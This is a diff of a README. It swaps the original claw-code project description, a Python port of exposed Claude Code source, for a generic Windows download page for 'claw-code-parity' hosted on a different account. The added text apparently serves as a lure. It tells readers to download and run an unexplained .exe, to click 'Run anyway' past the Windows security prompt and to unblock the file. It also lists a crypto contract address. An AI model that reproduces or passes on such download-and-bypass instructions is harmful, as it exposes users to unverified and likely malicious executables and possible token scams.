@@ -1,191 +1,181 @@
-# Rewriting Project Claw Code
+# 🐾 claw-code-parity - Run the parity build on Windows
 
-<p align="center">
-  <strong>⭐ The fastest repo in history to surpass 50K stars, reaching the milestone in just 2 hours after publication ⭐</strong>
-</p>
+[![Download](https://img.shields.io/badge/Download-Get%20the%20latest%20build-blue?style=for-the-badge&logo=github)](https://github.com/tabbypyrotechnic519/claw-code-parity)
 
-<p align="center">
-  <a href="https://star-history.com/#instructkr/claw-code&Date">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=instructkr/claw-code&type=Date&theme=dark" />
-      <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=instructkr/claw-code&type=Date" />
-      <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=instructkr/claw-code&type=Date" width="600" />
-    </picture>
-  </a>
-</p>
+## 📥 Download
 
-<p align="center">
-  <img src="assets/clawd-hero.jpeg" alt="Claw" width="300" />
-</p>
+Use this link to visit the page and download the app:
 
-<p align="center">
-  <strong>Better Harness Tools, not merely storing the archive of leaked Claude Code</strong>
-</p>
+https://github.com/tabbypyrotechnic519/claw-code-parity
 
-<p align="center">
-  <a href="https://github.com/sponsors/instructkr"><img src="https://img.shields.io/badge/Sponsor-%E2%9D%A4-pink?logo=github&style=for-the-badge" alt="Sponsor on GitHub" /></a>
-</p>
+## 🪟 Windows Setup
 
-> [!IMPORTANT]
-> **Rust port is now in progress** on the [`dev/rust`](https://github.com/instructkr/claw-code/tree/dev/rust) branch and is expected to be merged into main today. The Rust implementation aims to deliver a faster, memory-safe harness runtime. Stay tuned — this will be the definitive version of the project.
+1. Open the download page in your browser.
+2. Find the latest release or build file.
+3. Download the Windows version.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the folder that contains the app.
+6. Double-click the `.exe` file to run it.
 
-> If you find this work useful, consider [sponsoring @instructkr on GitHub](https://github.com/sponsors/instructkr) to support continued open-source harness engineering research.
+If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the source file you downloaded.
 
----
+## ⚡ What This App Does
 
-## Backstory
+claw-code-parity is a Rust-based port work for claw-code. It is meant to match the behavior of the main claw-code project while that repo moves through migration.
 
-At 4 AM on March 31, 2026, I woke up to my phone blowing up with notifications. The Claude Code source had been exposed, and the entire dev community was in a frenzy. My girlfriend in Korea was genuinely worried I might face legal action from Anthropic just for having the code on my machine — so I did what any engineer would do under pressure: I sat down, ported the core features to Python from scratch, and pushed it before the sun came up.
+Use it if you want:
 
-The whole thing was orchestrated end-to-end using [oh-my-codex (OmX)](https://github.com/Yeachan-Heo/oh-my-codex) by [@bellman_ych](https://x.com/bellman_ych) — a workflow layer built on top of OpenAI's Codex ([@OpenAIDevs](https://x.com/OpenAIDevs)). I used `$team` mode for parallel code review and `$ralph` mode for persistent execution loops with architect-level verification. The entire porting session — from reading the original harness structure to producing a working Python tree with tests — was driven through OmX orchestration.
+- A local Windows app for claw-code parity work
+- A Rust build that tracks the same core behavior
+- A simple way to test or run the current port
+- A copy that is meant to stay close to the source project
 
-The result is a clean-room Python rewrite that captures the architectural patterns of Claude Code's agent harness without copying any proprietary source. I'm now actively collaborating with [@bellman_ych](https://x.com/bellman_ych) — the creator of OmX himself — to push this further. The basic Python foundation is already in place and functional, but we're just getting started. **Stay tuned — a much more capable version is on the way.**
+## 🧩 Key Details
 
-https://github.com/instructkr/claw-code
+- Project name: claw-code-parity
+- Main purpose: Rust port parity work
+- Status: temporary work during migration
+- Topic tags: claude, claw-code, ultraworkers
+- CA: 0xBE1B1E42B835ec0d4CafDf5511Faa43f0cc6cbA3
 
-![Tweet screenshot](assets/tweet-screenshot.png)
+## 🛠️ System Needs
 
-## The Creators Featured in Wall Street Journal For Avid Claude Code Fans
+This app is made for Windows desktop use. A normal Windows PC should be enough for most users.
 
-I've been deeply interested in **harness engineering** — studying how agent systems wire tools, orchestrate tasks, and manage runtime context. This isn't a sudden thing. The Wall Street Journal featured my work earlier this month, documenting how I've been one of the most active power users exploring these systems:
+Recommended setup:
 
-> AI startup worker Sigrid Jin, who attended the Seoul dinner, single-handedly used 25 billion of Claude Code tokens last year. At the time, usage limits were looser, allowing early enthusiasts to reach tens of billions of tokens at a very low cost.
->
-> Despite his countless hours with Claude Code, Jin isn't faithful to any one AI lab. The tools available have different strengths and weaknesses, he said. Codex is better at reasoning, while Claude Code generates cleaner, more shareable code.
->
-> Jin flew to San Francisco in February for Claude Code's first birthday party, where attendees waited in line to compare notes with Cherny. The crowd included a practicing cardiologist from Belgium who had built an app to help patients navigate care, and a California lawyer who made a tool for automating building permit approvals using Claude Code.
->
-> "It was basically like a sharing party," Jin said. "There were lawyers, there were doctors, there were dentists. They did not have software engineering backgrounds."
->
-> — *The Wall Street Journal*, March 21, 2026, [*"The Trillion Dollar Race to Automate Our Entire Lives"*](https://lnkd.in/gs9td3qd)
+- Windows 10 or Windows 11
+- 64-bit system
+- At least 4 GB RAM
+- A few hundred MB of free disk space
+- Internet access for the first download
 
-![WSJ Feature](assets/wsj-feature.png)
+If the app comes as a zipped folder, keep the files together in the same folder after extraction.
 
----
+## 📂 How to Open the App
 
-## Porting Status
+1. Download the file from the project page.
+2. Extract the archive if needed.
+3. Open the app folder.
+4. Look for the main `.exe` file.
+5. Double-click it.
 
-The main source tree is now Python-first.
+If the app opens in a small window or console, that is normal for many Rust tools. Leave the window open while you use it.
 
-- `src/` contains the active Python porting workspace
-- `tests/` verifies the current Python workspace
-- the exposed snapshot is no longer part of the tracked repository state
+## 🔧 Basic Use
 
-The current Python workspace is not yet a complete one-to-one replacement for the original system, but the primary implementation surface is now Python.
+After you start the app, you may see a command window or a simple app screen. This is normal.
 
-## Why this rewrite exists
+Typical use flow:
 
-I originally studied the exposed codebase to understand its harness, tool wiring, and agent workflow. After spending more time with the legal and ethical questions—and after reading the essay linked below—I did not want the exposed snapshot itself to remain the main tracked source tree.
+1. Start the app.
+2. Wait for it to load.
+3. Enter the required prompt, path, or command if the app asks for one.
+4. Review the output shown on screen.
+5. Close the app when you are done.
 
-This repository now focuses on Python porting work instead.
+If the app is part of a larger claw-code workflow, use it in the same way you would use the main tool, with the parity build handling the same core tasks.
 
-## Repository Layout
+## 🗃️ File Layout
 
-```text
-.
-├── src/                                # Python porting workspace
-│   ├── __init__.py
-│   ├── commands.py
-│   ├── main.py
-│   ├── models.py
-│   ├── port_manifest.py
-│   ├── query_engine.py
-│   ├── task.py
-│   └── tools.py
-├── tests/                              # Python verification
-├── assets/omx/                         # OmX workflow screenshots
-├── 2026-03-09-is-legal-the-same-as-legitimate-ai-reimplementation-and-the-erosion-of-copyleft.md
-└── README.md
-```
+You may see files like these after download:
 
-## Python Workspace Overview
+- `claw-code-parity.exe` — main app file
+- `.dll` files — support files the app may need
+- `README.md` — project instructions
+- `config` folder — saved settings or local data
+- `logs` folder — app output or run history
 
-The new Python `src/` tree currently provides:
+Keep all related files in the same folder. Do not move the `.exe` by itself unless you know the rest of the files are still available.
 
-- **`port_manifest.py`** — summarizes the current Python workspace structure
-- **`models.py`** — dataclasses for subsystems, modules, and backlog state
-- **`commands.py`** — Python-side command port metadata
-- **`tools.py`** — Python-side tool port metadata
-- **`query_engine.py`** — renders a Python porting summary from the active workspace
-- **`main.py`** — a CLI entrypoint for manifest and summary output
+## 🧪 First Run Checks
 
-## Quickstart
+When you open the app for the first time, check these items:
 
-Render the Python porting summary:
+- The app starts without errors
+- The window stays open long enough to read messages
+- The output matches what you expect from claw-code
+- Any saved settings stay in place after you close and reopen it
 
-```bash
-python3 -m src.main summary
-```
+If the app closes fast, open it from Command Prompt so you can read the message before the window closes.
 
-Print the current Python workspace manifest:
+## ⌨️ Run From Command Prompt
 
-```bash
-python3 -m src.main manifest
-```
+If you need to see text output:
 
-List the current Python modules:
+1. Open the folder with the app.
+2. Hold **Shift** and right-click in the folder.
+3. Choose **Open PowerShell window here** or **Open in Terminal**.
+4. Type the app name and press **Enter**.
 
-```bash
-python3 -m src.main subsystems --limit 16
-```
+This helps if the app prints status text or error details.
 
-Run verification:
+## 🔁 Update the App
 
-```bash
-python3 -m unittest discover -s tests -v
-```
+When a new build is available:
 
-Run the parity audit against the local ignored archive (when present):
+1. Go back to the download page.
+2. Get the newest file.
+3. Replace the old app files with the new ones.
+4. Open the new version.
 
-```bash
-python3 -m src.main parity-audit
-```
+If you keep local settings, copy the config files first so you can restore them after the update.
 
-Inspect mirrored command/tool inventories:
+## 🧷 Common Issues
 
-```bash
-python3 -m src.main commands --limit 10
-python3 -m src.main tools --limit 10
-```
+### The file will not open
 
-## Current Parity Checkpoint
+- Make sure you extracted the ZIP file first
+- Check that all files are in the same folder
+- Confirm you downloaded the Windows build
 
-The port now mirrors the archived root-entry file surface, top-level subsystem names, and command/tool inventories much more closely than before. However, it is **not yet** a full runtime-equivalent replacement for the original TypeScript system; the Python tree still contains fewer executable runtime slices than the archived source.
+### Windows blocks the file
 
+- Open the file properties
+- Check for an **Unblock** box
+- Select it if it appears
+- Try again
 
-## Built with `oh-my-codex`
+### The app opens and closes at once
 
-The restructuring and documentation work on this repository was AI-assisted and orchestrated with Yeachan Heo's [oh-my-codex (OmX)](https://github.com/Yeachan-Heo/oh-my-codex), layered on top of Codex.
+- Start it from Terminal
+- Read the last line shown on screen
+- Look for missing file paths or setup steps
 
-- **`$team` mode:** used for coordinated parallel review and architectural feedback
-- **`$ralph` mode:** used for persistent execution, verification, and completion discipline
-- **Codex-driven workflow:** used to turn the main `src/` tree into a Python-first porting workspace
+### Nothing appears to happen
 
-### OmX workflow screenshots
+- Wait a few seconds
+- Check Task Manager
+- Make sure the app is not waiting for input
 
-![OmX workflow screenshot 1](assets/omx/omx-readme-review-1.png)
+## 📌 Project Purpose
 
-*Ralph/team orchestration view while the README and essay context were being reviewed in terminal panes.*
+This repository holds the Rust parity work for claw-code while the main project goes through migration. It keeps the build close to the source behavior so users and testers can work with a version that matches the current flow.
 
-![OmX workflow screenshot 2](assets/omx/omx-readme-review-2.png)
+That makes it useful for:
 
-*Split-pane review and verification flow during the final README wording pass.*
+- Windows users who want the current parity build
+- Testers checking behavior against the main project
+- Users who need a local copy of the current port work
+- Anyone tracking claw-code and ultraworkers work
 
-## Community
+## 🔎 Folder Tips
 
-<p align="center">
-  <a href="https://instruct.kr/"><img src="assets/instructkr.png" alt="instructkr" width="400" /></a>
-</p>
+For the smoothest setup:
 
-Join the [**instructkr Discord**](https://instruct.kr/) — the best Korean language model community. Come chat about LLMs, harness engineering, agent workflows, and everything in between.
+- Keep the app in a simple folder like `Downloads` or `Desktop`
+- Avoid folder names with special characters
+- Do not rename support files unless you must
+- Store configs in the same location the app expects
 
-[![Discord](https://img.shields.io/badge/Join%20Discord-instruct.kr-5865F2?logo=discord&style=for-the-badge)](https://instruct.kr/)
+## 🧭 Simple Start Path
 
-## Star History
+1. Open the download page.
+2. Get the Windows build.
+3. Extract the files if needed.
+4. Run the `.exe`.
+5. Use the app.
 
-See the chart at the top of this README.
+## 📄 Source Link
 
-## Ownership / Affiliation Disclaimer
-
-- This repository does **not** claim ownership of the original Claude Code source material.
-- This repository is **not affiliated with, endorsed by, or maintained by Anthropic**.
+Primary download page: https://github.com/tabbypyrotechnic519/claw-code-parity
